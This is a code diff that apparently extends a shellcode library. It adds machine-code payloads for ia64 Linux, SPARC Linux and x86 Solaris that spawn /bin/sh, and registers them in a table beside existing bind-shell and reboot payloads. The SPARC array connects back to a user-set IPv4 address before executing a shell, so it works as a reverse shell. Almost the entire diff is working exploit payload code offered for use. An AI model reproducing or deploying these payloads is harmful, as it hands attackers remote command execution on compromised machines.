@@ -68,6 +68,72 @@ freebsd_selfsigstop:
 
 #endif
 
+/* from phrack57 */
+unsigned long ia64_linux_binsh[] = {
+  /* MLX
+   * alloc r34 = ar.pfs, 0, 3, 3, 0   // allocate vars for syscall
+   * movl r14 = 0x0168732f6e69622f    // aka "/bin/sh",0x01
+   * ;; */
+  0x2f6e458006191005,
+  0x631132f1c0016873,
+
+  /* MLX
+   * xor r37 = r37, r37               // NULL
+   * movl r17 = 0x48f017994897c001    // bundle[0]
+   * ;; */
+  0x9948a00f4a952805,
+  0x6602e0122048f017,
+
+  /* MII
+   * adds r15 = 0x1094, r37           // unfinished bundle[1]
+   * or r22 = 0x08, r37               // part 1 of bundle[1]
+   * dep r12 = r37, r12, 0, 8         // align stack ptr
+   * ;; */
+  0x416021214a507801,
+  0x4fdc625180405c94,
+
+  /* MII
+   * adds r35 = -40, r12              // circling mem addr 1, shellstr addr
+   * adds r36 = -32, r12              // circling mem addr 2, args[0] addr
+   * dep r15 = r22, r15, 56, 8        // patch bundle[1] (part 1)
+   * ;; */
+  0x0240233f19611801,
+  0x41dc7961e0467e33,
+
+  /* MII
+   * st8 [r36] = r35, 16              // args[0] = shellstring addr
+   * adds r19 = -16, r12              // prepare branch addr: bundle[0] addr
+   * or r23 = 0x42, r37               // part 2 of bundle[1]
+   * ;; */
+  0x81301598488c8001,
+  0x80b92c22e0467e33,
+
+  /* MII
+   * st8 [r36] = r17, 8               // store bundle[0]
+   * dep r14 = r37, r14, 56, 8        // fix shellstring
+   * dep r15 = r23, r15, 16, 8        // patch bundle[1] (part 2)
+   * ;; */
+  0x28e0159848444001,
+  0x4bdc7971e020ee39,
+
+  /* MMI
+   * st8 [r35] = r14, 25              // store shellstring
+   * cmp.eq p2, p8 = r37, r37         // prepare predicate for final branch.
+   * mov b6 = r19                     // (+0x01) setup branch reg
+   * ;; */
+  0x282015984638c801,
+  0x07010930c0701095,
+
+  /* MIB
+   * st8 [r36] = r15, -16             // store bundle[1]
+   * adds r35 = -25, r35              // correct string addr
+   * (p2) br.cond.spnt.few b6         // (+0x01) branch to constr. bundle
+   * ;; */
+  0x3a301799483f8011,
+  0x0180016001467e8f,
+};
+
+
 unsigned char nopcode_carver[] ="\x61\x66\x3D\x90\x90\x75\xF9\x54\xc3";
 
 unsigned char x86_linux_binsh[] =
@@ -85,6 +151,62 @@ int mips_linux_binsh[] = {
 	0x3529732f, 0xafa80000, 0xafa90004, 0xafbd0008, 0xafa0000c, 0x03a02021,
 	0x23a50008, 0x00003021, 0x24020fab, 0x0000000c, 0x00000000, 0x00000000,
 	0x00000000, 0x00000000, 0x00000000, 0x00000000 };
+
+char sparc_linux_binsh[]=
+  "\x9d\xe3\xbf\x80"    // save  %sp, -128, %sp
+  "\x90\x10\x20\x02"    // mov  2, %o0
+  "\xd0\x37\xbf\xe0"    // sth  %o0, [ %fp + -32 ]
+  "\x90\x10\x29\x09"    // mov  0x909, %o0
+  "\xd0\x37\xbf\xe2"    // sth  %o0, [ %fp + -30 ]
+  "\x13\x30\x2a\x19"    // sethi  %hi(0xc0a86400), %o1 <- IPv4 ADDRESS MODIFY THIS.
+  "\x90\x12\x60\x01"    // or  %o1, 1, %o0             <- ALSO THIS.
+  "\xd0\x27\xbf\xe4"    // st  %o0, [ %fp + -28 ]
+  "\x90\x10\x20\x02"    // mov  2, %o0
+  "\x92\x10\x20\x01"    // mov  1, %o1
+  "\x94\x22\x60\x01"    // sub  %o1, 1, %o2
+  "\xd0\x23\xa0\x44"    // st  %o0, [ %sp + 0x44 ]
+  "\xd2\x23\xa0\x48"    // st  %o1, [ %sp + 0x48 ]
+  "\xd4\x23\xa0\x4c"    // st  %o2, [ %sp + 0x4c ]
+  "\x90\x10\x20\x01"    // mov  1, %o0
+  "\x92\x03\xa0\x44"    // add  %sp, 0x44, %o1
+  "\x82\x10\x20\xce"    // mov  0xce, %g1
+  "\x91\xd0\x20\x10"    // ta  0x10
+  "\xd0\x27\xbf\xf4"    // st  %o0, [ %fp + -12 ]
+  "\x92\x07\xbf\xe0"    // add  %fp, -32, %o1
+  "\xd0\x07\xbf\xf4"    // ld  [ %fp + -12 ], %o0
+  "\x94\x10\x20\x10"    // mov  0x10, %o2
+  "\xd0\x23\xa0\x44"    // st  %o0, [ %sp + 0x44 ]
+  "\xd2\x23\xa0\x48"    // st  %o1, [ %sp + 0x48 ]
+  "\xd4\x23\xa0\x4c"    // st  %o2, [ %sp + 0x4c ]
+  "\x90\x10\x20\x03"    // mov  3, %o0
+  "\x92\x03\xa0\x44"    // add  %sp, 0x44, %o1
+  "\x82\x10\x20\xce"    // mov  0xce, %g1
+  "\x91\xd0\x20\x10"    // ta  0x10
+  "\xd0\x07\xbf\xf4"    // ld  [ %fp + -12 ], %o0
+  "\x92\x1a\x40\x09"    // xor  %o1, %o1, %o1
+  "\x82\x10\x20\x5a"    // mov  0x5a, %g1
+  "\x91\xd0\x20\x10"    // ta  0x10
+  "\xd0\x07\xbf\xf4"    // ld  [ %fp + -12 ], %o0
+  "\x92\x10\x20\x01"    // mov  1, %o1
+  "\x82\x10\x20\x5a"    // mov  0x5a, %g1
+  "\x91\xd0\x20\x10"    // ta  0x10
+  "\xd0\x07\xbf\xf4"    // ld  [ %fp + -12 ], %o0
+  "\x92\x10\x20\x02"    // mov  2, %o1
+  "\x82\x10\x20\x5a"    // mov  0x5a, %g1
+  "\x91\xd0\x20\x10"    // ta  0x10
+  "\x2d\x0b\xd8\x9a"    // sethi  %hi(0x2f626800), %l6
+  "\xac\x15\xa1\x6e"    // or  %l6, 0x16e, %l6
+  "\x2f\x0b\xdc\xda"    // sethi  %hi(0x2f736800), %l7
+  "\x90\x0b\x80\x0e"    // and  %sp, %sp, %o0
+  "\x92\x03\xa0\x08"    // add  %sp, 8, %o1
+  "\xa6\x10\x20\x01"    // mov  1, %l3
+  "\x94\x24\xe0\x01"    // sub  %l3, 1, %o2
+  "\x9c\x03\xa0\x10"    // add  %sp, 0x10, %sp
+  "\xec\x3b\xbf\xf0"    // std  %l6, [ %sp + -16 ]
+  "\xd0\x23\xbf\xf8"    // st  %o0, [ %sp + -8 ]
+  "\xc0\x23\xbf\xfc"    // clr  [ %sp + -4 ]
+  "\x82\x10\x20\x3b"    // mov  0x3b, %g1
+  "\x91\xd0\x20\x10";
 
 unsigned char x86_linux_bind4444[] =
    "\x33\xc9\x83\xe9\xeb\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x81\x9c\x95"
@@ -383,6 +505,32 @@ unsigned char x86_bsdlinux_binsh[] = // by dymitrii
   "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x53\x50"
   "\x8c\xe0\x21\xc0\x74\x04\xb0\x3b\xeb\x07\xb0\x0b\x99\x52\x53\x89\xe1\xcd\x80";
 
+char x86_solaris_binsh[] = 
+"\xeb\x33\x5e\x8d\x06\x29\xc9\x89\xf3\x89\x5e\x08\xb1\x07\x80\x03\x20"      
+"\x43"              
+"\xe0\xfa"          
+"\x93"              
+"\x29\xc0"          
+"\x89\x5e\x0b"      
+"\x29\xd2"          
+"\x88\x56\x19"      
+"\x89\x56\x07"      
+"\x89\x56\x0f"      
+"\x89\x56\x14"      
+"\xb0\x3b"          
+"\x8d\x4e\x0b"      
+"\x89\xca"          
+"\x52"              
+"\x51"              
+"\x53"              
+"\x50"              
+"\xeb\x18"          
+"\xe8\xc8\xff\xff\xff"         
+"\x0f\x42\x49\x4e\x0f\x53\x48" 
+"\x01\x01\x01\x01\x02\x02\x02\x02\x03\x03\x03\x03"
+"\x9a\x04\x04\x04\x04\x07\x04";
+
+
 unsigned char x86_solaris_binshu[] = 
 "\xeb\x33\x5e\x8d\x06\x29\xc9\x89\xf3\x89\x5e\x08\xb1\x07\x80\x03\x20\x43\xe0\xfa"
 "\x93\x29\xc0\x89\x5e\x0b\x29\xd2\x88\x56\x19\x89\x56\x07\x89\x56\x0f\x89\x56\x14"
@@ -582,7 +730,9 @@ struct shellcode_t shellcodes[] = {
  ENTRY(0,0,0,"ppc.osx.bind4444",      ppc_osx_bind4444,         "Binds a shell at port 4444" )
  ENTRY(0,0,0,"ppc.osx.reboot",        ppc_osx_reboot,           "Reboots the box" )
  ENTRY(0,0,0,"ppc.bsd.binsh",         ppc_bsd_binsh,            "Runs /bin/sh" )
+ ENTRY(0,0,0,"sparc.linux.binsh",  sparc_linux_binsh,     "Runs /bin/sh on sparc/linux" )
  ENTRY(0,0,0,"sparc.linux.bind4444",  sparc_linux_bind4444,     "Binds a shell at TCP port 4444" )
+ ENTRY(0,0,0,"ia64.linux.binsh",      ia64_linux_binsh,         "Executes /bin/sh on Intel Itanium" )
  ENTRY(0,0,0,"x64.linux.binsh",       x64_linux_binsh,          "Runs /bin/sh on 64 bits" )
  ENTRY(0,0,0,"x86.bsd.binsh",         x86_bsd_binsh,            "Executes /bin/sh" )
  ENTRY(0,0,0,"x86.bsd.binsh2",        x86_bsd_binsh2,           "Executes /bin/sh" )
@@ -603,6 +753,7 @@ struct shellcode_t shellcodes[] = {
  ENTRY(0,0,0,"x86.openbsd.bind6969",  x86_openbsd_bind6969,     "Executes /bin/sh" )
  ENTRY(0,0,0,"x86.osx.binsh",         x86_osx_binsh,            "Executes /bin/sh" )
  ENTRY(0,0,0,"x86.osx.bind4444",      x86_osx_bind4444,         "Binds a shell at port 4444" )
+ ENTRY(0,0,0,"x86.solaris.binsh",     x86_solaris_binsh,        "Runs /bin/sh" )
  ENTRY(0,0,0,"x86.solaris.binshu",    x86_solaris_binshu,       "Runs /bin/sh (toupper() safe)" )
  ENTRY(0,0,0,"x86.solaris.bind4444",  x86_solaris_bind4444,     "Binds a shell at port 4444" )
  ENTRY(0,0,0,"x86.w32.msg",           x86_w32_msg,              "Shows a MessageBox" )
